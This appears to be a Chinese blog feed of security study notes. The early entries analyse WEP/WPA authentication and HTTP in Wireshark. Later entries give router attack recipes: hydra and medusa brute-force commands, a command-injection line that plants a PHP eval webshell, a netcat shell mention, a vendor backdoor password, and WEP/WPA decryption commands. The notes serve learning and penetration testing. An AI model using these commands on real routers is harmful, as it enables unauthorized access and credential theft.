<p>在第6个数据包中，这个数据包被确认。然后无线客户端将用WEP密码解密的质询文本返回给WAP：<br><img src="/2017/03/28/无线网络数据包初探实验/4.jpg" alt="4"><br>8号数据包是WAP对于无线客户端的响应，响应里面包含了一个说明认证成功的通知：<br><img src="/2017/03/28/无线网络数据包初探实验/5.jpg" alt="5"><br>认证成功之后，客户端可以发送关联（association）请求、接收请求、完成连接过程：<br><img src="/2017/03/28/无线网络数据包初探实验/6.jpg" alt="6"><br>接下来我们分析一下实验文件Lab24-3.pcap。这个文件是一位用户输入他的WEP密码连接到WAP，几秒后，无线客户端程序报告无法连接到无线网络，但是并没有给出原因。可以看到，与连接成功的时候一样，通信从3号数据包开始，这个数据包是WAP发送给无线客户端的质询文本。这个消息被成功确认了。接着，在5号数据包中，无线客户端使用用户提供的WEP密码发送了响应。</p>
<p>按道理，如果一切正常，应该会收到一个通知告诉我们认证成功了。但是如果我们查看7号数据包，却看到了不一样的情况：<br><img src="/2017/03/28/无线网络数据包初探实验/7.jpg" alt="7"><br>这个消息告诉我们无线客户端对质询文本的响应不正确。表明客户端用以解密质询文本的WEP密码肯定是输入错误，从而导致了连接失败。必须要使用正确的密码重试才可以。  </p>
<p>##WPA认证分析<br>WPA使用了与WEP完全不同的认证方式，但是它仍然依赖于用户在无线客户端输入密码来连接到网络。实验文件Lab24-4.pcap是一个成功认证的例子：<br><img src="/2017/03/28/无线网络数据包初探实验/8.jpg" alt="8"><br>这个捕获文件的第一个数据包是WAP发送的beacon广播。展开这个数据包的802.11头部，沿着tagged parameters往下看，展开Vendor Specific标题，就可以看到无线接入点的WPA属性部分。可以看到，无线接入点支持WPA，以及版本与实现厂商。 无线客户端在接收到这个beacon广播之后，就向无线接入点发送一个探测请求，并得到了响应。无线客户端和无线接入点在4~7号数据包之间生成认证与关联的请求以及响应。 接下来看一下8号数据包。这是WPA开始握手的地方一直持续到11号数据包。这个握手的过程就是WPA质询响应的过程：<br><img src="/2017/03/28/无线网络数据包初探实验/9.jpg" alt="9"><br>这里有两个质询与响应。每个数据包都可在基于802.1x Authentication头部下的Replay Counter域找到匹配对象。注意到前两个握手数据包的Replay Counter的值是1，而后两个握手数据包的值是2，相同的值表示为互相配对。 当WPA握手完成、认证成功之后，数据就开始在无线客户端和WAP之间传输了。 最后我们再来研究一下实验文件Lab24-5.pcap。这是一个失败的认证过程。与WEP一样，当用户输入WPA的密码之后，无线客户端程序报告无法连接到无线网络，但是并没有指出问题在哪里，所以现在就有必要来看看发生了什么。 如同刚才成功的WAP认证一样，捕获文件以同样的方式开始。包括探测、认证和关联请求。WPA握手的过程是从8号数据包开始的。但是在这个捕获文件中，我们看到了8个握手数据包，而不是之前的4个：<br><img src="/2017/03/28/无线网络数据包初探实验/10.jpg" alt="10"><br>8号和9号数据包是表示WPA握手的前两个数据包。但是在这个例子中，客户端发送回WAP的质询文本有错误。结果这个序列在数据包10和11、12和13、14和15中多次重复。使用Replay Counter值可以配对每个请求和响应。</p>
<p>在握手过程重复4次之后，通信就能终止了，16号数据包表示客户端没有通过认证。  </p>
<p>##小结<br>本次课所讲述的内容不过是无线网络的冰山一角，更多的东西还是需要大家的探索与学习的。比如本次课程我并没有讲述无线数据包的捕获，因为捕获技术在Kali Linux系统中实现较为方便。而Kali Linux又是一个包含了诸多知识的课程，不太适合在这里详细讲述，所以有兴趣的朋友可以去专门学习相关的课程。</p>
<p>至此，《网络数据包分析从入门到精通》的协议篇就给大家讲解完毕了，希望大家能够对于我所讲的内容烂熟在胸。因为接下来要讲述的排错篇以及安全篇，其实都是基于协议篇的基础知识，延伸出来讲解的，所以希望大家把关键的课程多看几遍，为接下来的学习打下坚实的基础。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[每天都要接触的HTTP协议]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%AF%8F%E5%A4%A9%E9%83%BD%E8%A6%81%E6%8E%A5%E8%A7%A6%E7%9A%84HTTP%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##HTTP工作流程<br>HTTP是一个无状态的协议。所谓的无状态指的是客户端（Web浏览器）和服务器之间不需要建立持久的连接。这也就意味着当一个客户端向服务器发出请求，然后服务器返回响应之后，连接也就关闭了。服务器并不会保留连接的相关信息，HTTP遵循的是请求（Request）/应答（Response）模型。客户端（Web浏览器）向服务器发送请求，服务器处理请求并返回适当的应答。所有的HTTP连接都被构造成一套请求和应答。在这个过程中要经历4个阶段，包括建立连接、发送请求信息、发送响应信息和关闭连接，如下图所示：<br><img src="/2017/03/28/每天都要接触的HTTP协议/1.jpg" alt="1"><br>由上图可知，HTTP的工作流程为：</p>
<p>1、客户端通过TCP的三次握手建立与服务器的连接。</p>
<p>2、当TCP连接成功建立后，客户端向服务器发送HTTP请求。</p>
<p>3、服务器收到客户端的HTTP请求后，将回复响应数据包，并向客户端发送数据。</p>
<p>4、客户端通过TCP四次握手，与服务器断开TCP连接。  </p>
<p>##HTTP连接数据包的捕获<br>刚才说了，HTTP需要使用TCP的三次握手来建立连接，那么我们在使用Wireshark进行数据包的捕获时，需要在筛选条件中加上TCP这个筛选条件。我们的目标是捕获到使用HTTP浏览网页的数据包。那么当我们开启捕获后，就可以打开浏览器，尝试浏览www.baidu.com网站，就可以获取与HTTP连接相关的一系列数据包。</p>
<p>可以发现，此时 Wireshark为我们捕获到了非常多的数据包（Lab14-1.pcapng）：<br><img src="/2017/03/28/每天都要接触的HTTP协议/2.jpg" alt="2"><br>由于浏览网页会使用GET方法，所以我们可以在筛选器中输入http.request.method==GET，这样就可以筛选出所有的GET方法了。筛选后可以发现第44号数据包排在了第一位，那么这个其实就是我们要寻找的，与百度建立连接的HTTP的数据包。我们可以对其进行着色处理，这样所有与其相关的数据包都会拥有相同的颜色。之后点击筛选器旁边的Clear，清除筛选条件，这样我们就可以看到完整的HTTP连接了。 这里我们把41至67号数据包导出来，命名为Lab14-1-get.pcapng，用于之后的分析。  </p>
<p>##HTTP连接数据包的分析<br>这里我们打开Lab14-1-get.pcapng文件。可以发现，整个通信是从客户端192.168.147.129到百度的Web服务器119.75.218.70的三次握手开始的：<br><img src="/2017/03/28/每天都要接触的HTTP协议/3.jpg" alt="3"><br>当连接建立之后，第一个标记为HTTP的数据包是从客户端发往服务器的：<br><img src="/2017/03/28/每天都要接触的HTTP协议/4.jpg" alt="4"><br>可以发现，HTTP数据包通过TCP被传输到服务器的80端口，也就是HTTP通信的标准端口（8080端口也常被使用）。</p>
<p>接下来可以看到，这个数据包所请求的方法是GET，所请求的URI是“/”，请求的版本为HTTP/1.1。这些信息告诉我们这个客户端请求使用HTTP的1.1版本，下载Web服务器的根目录（/）。这里面还包含有客户端向服务器发送的关于自己的信息。这些信息包含了类似于使用用户代理（User-Agent）、浏览器接受的语言（Accept-Language）以及Cookie等信息。为了保证兼容性，服务器可以利用这些信息决定返回给客户端的数据。</p>
<p>当服务器接收到了数据包4中的HTTP请求，它就会响应一个TCP ACK，用于数据包的确认，并在6到26号数据包中传输所请求的数据。HTTP只被用来发布客户端和服务器的应用层命令。当进行数据传输时，除了在数据流的开始和结束部分，是看不到应用层的控制信息的。</p>
<p>服务器将数据在6、7、8号数据包中发送，9号数据包是来自客户端的确认，10到24号数据包也是服务器发给客户端的数据，25号数据包是客户端发出的另一个确认。尽管HTTP仍然负责这些传输，但所有这些数据包在Wireshark中都被显示为TCP分片而不是HTTP数据包。当数据传输结束后，数据的重组装流就已经发送完了，就到了最后一个数据包：<br><img src="/2017/03/28/每天都要接触的HTTP协议/5.jpg" alt="5"><br>HTTP使用了一些预定义的响应码来表示请求方法的结果。这里我们看到了一个带有200状态码的数据包，表示一次成功的请求方法。这个数据包里面包含有一个时间戳，以及一些关于Web服务器内容编码和配置参数的额外信息。当客户端接收到这个数据包后，这次的处理也就完成了。  </p>
<p>##HTTP传送数据包分析<br>我们刚才所研究的是从Web服务器下载数据的过程，现在来研究一下上传数据。当我们在网站上进行提交表单或者上传文件的操作时，往往就能够捕获含有POST方法的数据包。这里我们看一下Lab14-2.pcap这个实验文件。这个实验文件是在当一个用户向一个网站发表评论的时候捕获的。最开始依旧是TCP的三次握手，之后客户端（172.16.16.128）向Web服务器（69.163.176.56）发送了一个HTTP的数据包：<br><img src="/2017/03/28/每天都要接触的HTTP协议/6.jpg" alt="6"><br>这个数据包使用了POST方法来向Web服务器上传数据以供处理。这里使用的POST方法指明了URI为/wp-comments-post.php，以及HTTP 1.1请求版本。如果想查看上传数据的内容，可以展开下方的HTML Form URL Encoded查看。 当这个数据包传输完之后，服务器会发送一个ACK数据包，并在第6个数据包中传输了一个响应码302（表示“找到”）作为回应：<br><img src="/2017/03/28/每天都要接触的HTTP协议/7.jpg" alt="7"><br>302响应码是HTTP的一个常用的重定向手段。这个数据包的Location域指明了客户端被重定向的位置。此时，这个地方就是评论所发表的原先的网页。最后，服务器传送一个状态码200，并且这个页面的内容会在接下来的一些数据包中进行发送，从而完成传输。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解SQL]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3SQL/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/漏洞实例讲解SQL/1.jpg" alt="1"><br><img src="/2017/03/28/漏洞实例讲解SQL/2.jpg" alt="2">  </p>
<p>##phpcms实例：<br><img src="/2017/03/28/漏洞实例讲解SQL/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解SQL/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解SQL/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解SQL/6.jpg" alt="6">  </p>
<p>##BlueCMS实例：<br><img src="/2017/03/28/漏洞实例讲解SQL/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解SQL/8.jpg" alt="8"><br><img src="/2017/03/28/漏洞实例讲解SQL/9.jpg" alt="9"><br><img src="/2017/03/28/漏洞实例讲解SQL/10.jpg" alt="10">  </p>
<p>##PHPYunCMS实例：<br><img src="/2017/03/28/漏洞实例讲解SQL/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解SQL/12.jpg" alt="12"><br><img src="/2017/03/28/漏洞实例讲解SQL/13.jpg" alt="13"><br><img src="/2017/03/28/漏洞实例讲解SQL/14.jpg" alt="14"><br><img src="/2017/03/28/漏洞实例讲解SQL/15.jpg" alt="15">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[维持访问-远程管理、XSS]]></title>
        <url>https://517736522.github.io/2017/02/15/%E7%BB%B4%E6%8C%81%E8%AE%BF%E9%97%AE-%E8%BF%9C%E7%A8%8B%E7%AE%A1%E7%90%86%E3%80%81XSS/</url>
        <content type="html"><![CDATA[<p>留后门。  </p>
<h2 id="远程WEB管理"><a href="#远程WEB管理" class="headerlink" title="远程WEB管理"></a>远程WEB管理</h2><p><img src="/2017/02/15/维持访问-远程管理、XSS/1.jpg" alt="1"><br>输入255.255.255.255所有人从外网上访问（注意WAN IP是不是外网IP,也许有些人做了NAT,所以会失效)   </p>
<p>nmap -sT IP<br>确定是不是开了<br><img src="/2017/02/15/维持访问-远程管理、XSS/2.jpg" alt="2">  </p>
<p><img src="/2017/02/15/维持访问-远程管理、XSS/3.jpg" alt="3">  </p>
<h2 id="动态DNS-DDNS"><a href="#动态DNS-DDNS" class="headerlink" title="动态DNS DDNS"></a>动态DNS DDNS</h2><p>比如xiwangdongtai 3322 花生壳  </p>
<p><img src="/2017/02/15/维持访问-远程管理、XSS/4.jpg" alt="4"><br>不管有没做NAT,还是内网层路由器，做了DDNS后都是可以访问的</p>
<h2 id="XSS-CSRF"><a href="#XSS-CSRF" class="headerlink" title="XSS,CSRF"></a>XSS,CSRF</h2><p>有些小厂商路由器未对输入框作过滤，导致的XSS<br><img src="/2017/02/15/维持访问-远程管理、XSS/5.jpg" alt="5"><br>获取的cookie，有些cookie会有账号密码  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 维持访问 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 维持访问 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[权限提升-破解无线路由器登陆密码]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E7%A0%B4%E8%A7%A3%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%E7%99%BB%E9%99%86%E5%AF%86%E7%A0%81/</url>
        <content type="html"><![CDATA[<p><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/1.jpg" alt="1">  </p>
<h2 id="爆破登陆页面"><a href="#爆破登陆页面" class="headerlink" title="爆破登陆页面  "></a>爆破登陆页面  </h2><p>hydra -L user.txt -P pass.txt <a href="http://33.1.1.254" target="_blank" rel="external">http://33.1.1.254</a><br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/2.jpg" alt="2">  </p>
<h2 id="MITM攻击破解路由器登陆密码"><a href="#MITM攻击破解路由器登陆密码" class="headerlink" title="MITM攻击破解路由器登陆密码  "></a>MITM攻击破解路由器登陆密码  </h2><p>通过中间人攻击窃听别人登陆<br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/3.jpg" alt="3"><br>获取到cookie也行，进行base64解码<br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/4.jpg" alt="4"><br><img src="/2017/02/15/权限提升-破解无线路由器登陆密码/5.jpg" alt="5">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 权限提升 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> hydra </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[权限提升-无线路由器漏洞攻击]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-%E6%97%A0%E7%BA%BF%E8%B7%AF%E7%94%B1%E5%99%A8%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB/</url>
        <content type="html"><![CDATA[<h2 id="CFG配置文件泄露攻击"><a href="#CFG配置文件泄露攻击" class="headerlink" title="CFG配置文件泄露攻击"></a>CFG配置文件泄露攻击</h2><p>路由器配置文件指的是路由器通过备份等方式形成的文件<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/1.jpg" alt="1"><br>点击按钮直接就是下载，说明配置文件已经存在内部<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/2.jpg" alt="2"><br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/3.jpg" alt="3">  </p>
<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/4.jpg" alt="4"><br>复制下载链接<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/5.jpg" alt="5"><br>在没登陆的情况下，下载，发现是可以的<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/6.jpg" alt="6"><br>这个漏洞不是每个路由器都存在的  </p>
<h2 id="WEB-UI会话劫持攻击"><a href="#WEB-UI会话劫持攻击" class="headerlink" title="WEB UI会话劫持攻击"></a>WEB UI会话劫持攻击</h2><p>老漏洞。<br>一般家用路由器不会有数据库来验证登陆的，都是用的配置文件  </p>
<p>1.假设10.1.1.1登陆了这个路由器<br>2.我把我的IP改为10.1.1.1<br>3.我去访问路由器，发现已经是登陆状态了<br>或者随便输账号密码就登陆进去了</p>
<h2 id="命令执行漏洞"><a href="#命令执行漏洞" class="headerlink" title="命令执行漏洞"></a>命令执行漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/7.jpg" alt="7"><br>命令执行+未授权访问  </p>
<h2 id="网络监测漏洞"><a href="#网络监测漏洞" class="headerlink" title="网络监测漏洞"></a>网络监测漏洞</h2><p>大部分路由器都是基于LINUX系统，造成原因是输入框没有过滤<br>30%的路由器都存在<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/8.jpg" alt="8"><br>那么可以这样利用<br>路由器可插入一句话木马（看你的路由器采用asp还是php环境）<br>ping 127.0.0.1 -c 1 &amp; “&lt;?php eval($_POST[a]);?&gt;” &gt; /var/www/yjh.php  </p>
<p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/9.jpg" alt="9"><br>也可以wget netcat 直连shell  </p>
<p>使用Cookie注入绕过密码登陆Tenda路由管理页<br>xiao106347.blog.163.com/blog/static/21599201401181817753<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/10.jpg" alt="10">  </p>
<h2 id="TLink后门漏洞"><a href="#TLink后门漏洞" class="headerlink" title="TLink后门漏洞"></a>TLink后门漏洞</h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/12.jpg" alt="12"><br>访问以上网页，需要输入账号密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/13.jpg" alt="13"><br>账号osteam密码5up<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/14.jpg" alt="14">  </p>
<h2 id="有些路由器存在密码验证安全漏洞"><a href="#有些路由器存在密码验证安全漏洞" class="headerlink" title="有些路由器存在密码验证安全漏洞  "></a>有些路由器存在密码验证安全漏洞  </h2><p>打开登陆页面-查看源文件-有时候会发现base64密码<br><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/15.jpg" alt="15"><br>截图不存在漏洞  </p>
<h2 id="乌云下也有很多漏洞"><a href="#乌云下也有很多漏洞" class="headerlink" title="乌云下也有很多漏洞  "></a>乌云下也有很多漏洞  </h2><p><img src="/2017/02/15/权限提升-无线路由器漏洞攻击/11.jpg" alt="11"><br>搜索路由器，牌子  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 权限提升 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87-RouterSwitch%E7%AD%89%E8%BF%9C%E7%A8%8B%E7%99%BB%E9%99%86TelnetSSH%E7%AD%89%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/</url>
        <content type="html"><![CDATA[<p>扫描网卡设备<br>nmap -sT 33.1.1.254<br>扫描TCP常用端口<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/1.jpg" alt="1"><br>发现telnet端口开放  </p>
<p>但是不知道telnet账号密码 ，只能通过爆破了<br>hydra -l cisco(假设知道账号） -P pass.txt telnet://33.1.1.254<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/2.jpg" alt="2">  </p>
<p>用medusa工具也行<br>medusa -h 10.1.1.254 -U user.txt -P pass.txt -M telnet<br><img src="/2017/02/15/权限提升-RouterSwitch等远程登陆TelnetSSH等暴力破解/3.jpg" alt="3">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 权限提升 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> hydra </tag>
            
            <tag> medusa </tag>
            
            <tag> 权限提升 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[报文处理-airdecap-ng解密报文]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-airdecap-ng%E8%A7%A3%E5%AF%86%E6%8A%A5%E6%96%87/</url>
        <content type="html"><![CDATA[<p>airdecap-ng用密码解密报文  </p>
<h2 id="解密WEP"><a href="#解密WEP" class="headerlink" title="解密WEP"></a>解密WEP</h2><p>这种会有限制，密码长度必须为5，13,16,29,61<br>而且密码格式是进行十六进制转换后的密码<br>airdecap-ng -w KEY wep.cap<br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/1.jpg" alt="1">  </p>
<p>###关于进制的转换可以到以下网站  </p>
<p><img src="/2017/02/15/报文处理-airdecap-ng解密报文/2.jpg" alt="2"><br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/3.jpg" alt="3">  </p>
<h2 id="解密WPA"><a href="#解密WPA" class="headerlink" title="解密WPA"></a>解密WPA</h2><p>airdecap-ng -l(不移除头部信息） -e [SSID] -p [PSK] wpa.cap<br><img src="/2017/02/15/报文处理-airdecap-ng解密报文/4.jpg" alt="4"><br>生成解密后的文件wpa-dec.cap  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 报文处理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> airdecap-ng </tag>
            
            <tag> 报文处理 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[报文处理-合并ivs-提取ivs-报文瘦身]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-%E5%90%88%E5%B9%B6ivs-%E6%8F%90%E5%8F%96ivs-%E6%8A%A5%E6%96%87%E7%98%A6%E8%BA%AB/</url>
        <content type="html"><![CDATA[<p>ivs:初始化向量<br>收集足够的ivs,用于破解WEP  </p>
<h2 id="合并ivs"><a href="#合并ivs" class="headerlink" title="合并ivs"></a>合并ivs</h2><p>ivstools –merge <ivs file1=""> <ivs file2=""> <output file=""><br>合并多个ivs文件<br>ivstools –merge 1.ivs 2.ivs 3.ivs  </output></ivs></ivs></p>
<h2 id="提取ivs"><a href="#提取ivs" class="headerlink" title="提取ivs"></a>提取ivs</h2><p>ivstool –convert wep.cap 1.ivs<br>从wep.cap包中提取ivs,保存为1.ivs<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/1.jpg" alt="1">  </p>
<h2 id="报文瘦身"><a href="#报文瘦身" class="headerlink" title="报文瘦身 "></a>报文瘦身 </h2><p>pyrit -r x.cap analyze<br>查看握手包情况<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/2.jpg" alt="2"><br>(但是截图没有握手包)<br>假设TP-Link_5A4A存在握手包，那么我只想把它提取出来。<br>pyrit -r x.cap -e TP-Link_5A4A -o output.cap strip<br><img src="/2017/02/15/报文处理-合并ivs-提取ivs-报文瘦身/3.jpg" alt="3"><br>(截图提取失败，因为不存在握手包。）  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 报文处理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 报文处理 </tag>
            
            <tag> ivstool </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[报文处理-使用Cain,Abel解密报文]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-%E4%BD%BF%E7%94%A8Cain-Abel%E8%A7%A3%E5%AF%86%E6%8A%A5%E6%96%87/</url>
        <content type="html"><![CDATA[<p>使用Cain嗅探工具解密报文<br>add to list<br>添加到列表<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/1.jpg" alt="1"><br>右键报文-Decode<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/2.jpg" alt="2"><br>会生成xxx-dec.cap<br>用wireshark打开<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/3.jpg" alt="3"><br>全都是解密后的报文  </p>
<p>以上是针对WEP的<br>下面是针对WPA的<br>同样将相对应的文件add to list<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/4.jpg" alt="4">  </p>
<p><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/5.jpg" alt="5"><br>WPA passphrase 应该为ASCII格式的（需要自己算)<br><img src="/2017/02/15/报文处理-使用Cain-Abel解密报文/6.jpg" alt="6"><br>可尝试下直接在此处输入密码  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 报文处理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 报文处理 </tag>
            
            <tag> Cain </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[报文处理-wireshark抓取WEP,WPA报文并解密]]></title>
        <url>https://517736522.github.io/2017/02/15/%E6%8A%A5%E6%96%87%E5%A4%84%E7%90%86-wireshark%E6%8A%93%E5%8F%96WEP-WPA%E6%8A%A5%E6%96%87%E5%B9%B6%E8%A7%A3%E5%AF%86/</url>
        <content type="html"><![CDATA[<h2 id="WEP解密"><a href="#WEP解密" class="headerlink" title="WEP解密"></a>WEP解密</h2><p>无线抓包时抓的包都是有802.11加密的<br>wireshark有802.11包解密功能  </p>
<p>airodump -w /root/wep  wlan0mon<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/1.jpg" alt="1">  </p>
<p>使用wireshark打开  </p>
<p><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/2.jpg" alt="2"><br>都是IEEE802.11类型包  </p>
<p>Edit-Preferences(首选项）-Protocols-802.11  </p>
<p><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/3.jpg" alt="3"><br>记得勾选上Enable decryption<br>输入十六进制格式的密码<br>应用后<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/4.jpg" alt="4"><br>采用这个密码的报文就会被解密  </p>
<h2 id="WPA解密"><a href="#WPA解密" class="headerlink" title="WPA解密  "></a>WPA解密  </h2><p>同样进入首选项<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/5.jpg" alt="5"><br>EDit<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/6.jpg" alt="6"><br>key为密码+SSID<br>应用后<br><img src="/2017/02/15/报文处理-wireshark抓取WEP-WPA报文并解密/7.jpg" alt="7">  </p>
<p>###window下的wireshark的格式：wpa-pwd:iSafe12345:iSafe_Normal  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 报文处理 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 报文处理 </tag>
            
            <tag> wireshark </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[安卓渗透-使用lanmitm,幻影PIN,zanti]]></title>
        <url>https://517736522.github.io/2017/02/14/%E5%AE%89%E5%8D%93%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8lanmitm-%E5%B9%BB%E5%BD%B1PIN-zanti/</url>
        <content type="html"><![CDATA[<h2 id="lanmitm"><a href="#lanmitm" class="headerlink" title="lanmitm"></a>lanmitm</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/1.jpg" alt="1">  </p>
<p>界面是这样的<br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/2.jpg" alt="2"><br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/3.jpg" alt="3">  </p>
<h2 id="幻影PIN"><a href="#幻影PIN" class="headerlink" title="幻影PIN"></a>幻影PIN</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/4.jpg" alt="4"><br><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/5.jpg" alt="5">  </p>
<h2 id="zanti"><a href="#zanti" class="headerlink" title="zanti"></a>zanti</h2><p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/6.jpg" alt="6">  </p>
<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/7.jpg" alt="7">  </p>
<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/8.jpg" alt="8">  </p>
<p><img src="/2017/02/14/安卓渗透-使用lanmitm-幻影PIN-zanti/9.jpg" alt="9">  </p>
]]></content>
        
        <categories>
            
            <category> 无线渗透 </category>
            
            <category> 安卓渗透 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 无线 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> lanmitm </tag>
            
            <tag> 幻影PIN </tag>
            
            <tag> zanti </tag>
            
            <tag> 安卓渗透 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
        <title><![CDATA[干扰通讯-实现无线IPS并访问控制（类似ACL）]]></title>
        <url>https://517736522.github.io/2017/02/14/%E5%B9%B2%E6%89%B0%E9%80%9A%E8%AE%AF-%E5%AE%9E%E7%8E%B0%E6%97%A0%E7%BA%BFIPS%E5%B9%B6%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%EF%BC%88%E7%B1%BB%E4%BC%BCACL%EF%BC%89/</url>
